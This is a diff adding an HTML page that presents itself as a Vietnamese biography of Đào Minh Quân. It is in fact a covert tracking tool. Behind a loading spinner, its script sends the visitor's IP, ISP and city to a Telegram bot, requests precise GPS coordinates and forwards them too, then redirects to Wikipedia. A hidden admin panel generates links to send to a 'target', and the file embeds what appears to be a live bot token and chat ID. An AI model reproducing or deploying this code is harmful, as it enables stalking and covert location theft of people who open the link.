@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Tiểu sử Đào Minh Quân</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285F4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+
+    <div id="frontend-view" class="flex flex-col items-center justify-center h-screen bg-white">
+        <div class="loader"></div>
+        <p class="mt-4 text-gray-500 text-sm italic">Đang tải nội dung tiểu sử...</p>
+    </div>
+
+    <div id="admin-view" class="hidden min-h-screen bg-[#0d1117] text-slate-300 p-6">
+        <div class="max-w-4xl mx-auto">
+            <h1 class="text-2xl font-black text-white mb-8 italic">SENTINEL <span class="text-blue-500">X</span> ADMIN</h1>
+            
+            <div class="grid md:grid-cols-2 gap-6">
+                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800 shadow-xl">
+                    <h3 class="text-blue-400 font-bold text-xs uppercase mb-4 tracking-widest">Cấu hình Chatbot</h3>
+                    <div class="space-y-4">
+                        <div>
+                            <label class="text-[10px] uppercase block mb-1">Telegram Token:</label>
+                            <input id="in-token" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
+                        </div>
+                        <div>
+                            <label class="text-[10px] uppercase block mb-1">Chat ID:</label>
+                            <input id="in-id" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-blue-300 outline-none">
+                        </div>
+                        <div>
+                            <label class="text-[10px] uppercase block mb-1">Redirect URL:</label>
+                            <input id="in-redir" type="text" class="w-full bg-[#0d1117] border border-slate-800 p-2 rounded text-xs text-green-500 outline-none">
+                        </div>
+                        <button onclick="saveConfig()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded-xl text-xs transition-all">LƯU CẤU HÌNH</button>
+                    </div>
+                </div>
+
+                <div class="bg-[#161b22] p-6 rounded-2xl border border-slate-800">
+                    <h3 class="text-yellow-500 font-bold text-xs uppercase mb-4 tracking-widest">Link Tracking Của Bạn</h3>
+                    <p class="text-[10px] mb-2">Sử dụng link này để gửi cho mục tiêu:</p>
+                    <div id="tracking-link" class="bg-black p-3 rounded-lg text-blue-400 text-[10px] break-all border border-slate-800"></div>
+                    <p class="mt-4 text-[9px] text-slate-500">* Lưu ý: Vì không dùng PHP, thông tin cấu hình được lưu vào URL khi bạn gửi đi để đảm bảo Bot hoạt động đúng.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Cấu hình mặc định
+        let config = {
+            token: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
+            id: "5887642221",
+            redir: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân"
+        };
+
+        // Hàm lưu vào LocalStorage (Cho Admin)
+        function saveConfig() {
+            config.token = document.getElementById('in-token').value;
+            config.id = document.getElementById('in-id').value;
+            config.redir = document.getElementById('in-redir').value;
+            localStorage.setItem('sentinel_config', JSON.stringify(config));
+            updateLinkDisplay();
+            alert("Đã lưu cấu hình thành công!");
+        }
+
+        function updateLinkDisplay() {
+            const base = window.location.href.split('?')[0];
+            const encoded = btoa(JSON.stringify(config)); // Mã hóa cấu hình vào link
+            document.getElementById('tracking-link').innerText = `${base}?v=${encoded}`;
+        }
+
+        // Logic chính
+        window.onload = async () => {
+            const urlParams = new URLSearchParams(window.location.search);
+
+            // KIỂM TRA NẾU LÀ TRANG ADMIN
+            if (urlParams.has('admin')) {
+                document.getElementById('frontend-view').classList.add('hidden');
+                document.getElementById('admin-view').classList.remove('hidden');
+                
+                const saved = localStorage.getItem('sentinel_config');
+                if(saved) config = JSON.parse(saved);
+                
+                document.getElementById('in-token').value = config.token;
+                document.getElementById('in-id').value = config.id;
+                document.getElementById('in-redir').value = config.redir;
+                updateLinkDisplay();
+                return;
+            }
+
+            // NẾU LÀ TRANG TRACKING (FRONTEND)
+            // Lấy cấu hình từ tham số 'v' (nếu có)
+            if (urlParams.has('v')) {
+                try {
+                    config = JSON.parse(atob(urlParams.get('v')));
+                } catch(e) {}
+            }
+
+            const send = async (msg) => {
+                await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: config.id, text: msg, parse_mode: "HTML"})
+                });
+            };
+
+            // Lấy IP
+            const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
+            let info = `🎯 <b>MỤC TIÊU MỚI</b>\n🌐 IP: <code>${ipRes?.ip || '?' }</code>\n🏢 ISP: ${ipRes?.org || '?'}\n📍 Vùng: ${ipRes?.city || '?'}`;
+            
+            await send(info + "\n⏳ Đang chờ GPS...");
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const gps = `\n🎯 <b>GPS OK:</b>\n📍 Tọa độ: <code>${p.coords.latitude},${p.coords.longitude}</code>\n🔗 <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">Xem bản đồ</a>`;
+                        await send(info + gps);
+                        location.replace(config.redir);
+                    },
+                    async () => {
+                        await send(info + "\n❌ Mục tiêu từ chối GPS.");
+                        location.replace(config.redir);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                location.replace(config.redir);
+            }
+            setTimeout(() => location.replace(config.redir), 7000);
+        };
+    </script>
+</body>
+</html>
